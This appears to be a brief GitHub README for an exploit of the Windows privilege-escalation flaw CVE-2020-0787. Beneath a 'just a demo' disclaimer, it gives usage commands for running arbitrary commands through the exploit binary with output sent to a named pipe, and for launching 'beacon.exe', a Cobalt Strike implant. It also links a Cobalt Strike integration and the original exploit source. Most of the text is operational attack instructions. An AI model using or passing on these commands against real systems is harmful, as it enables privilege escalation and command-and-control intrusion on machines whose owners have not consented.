
## CVE-2020-0787（named pipe）
It's Just A Demo,Do not use in real.

-Get result for Command execution(Use cmd /c)：
`exp.exe "cmd /c whoami > \\\\.\\pipe\\showme " show`

-Run beacon.exe：
`exp.exe "C:/beacon.exe"`

![](https://cdn.jsdelivr.net/gh/yanghaoi/CVE-2020-0787@latest/index.gif)

## For CobaltStrike
It's better one than current project:
https://github.com/yanghaoi/ReflectiveDllSource/tree/master/CVE-2020-0787_CNA

## Reference 
Source from: https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION

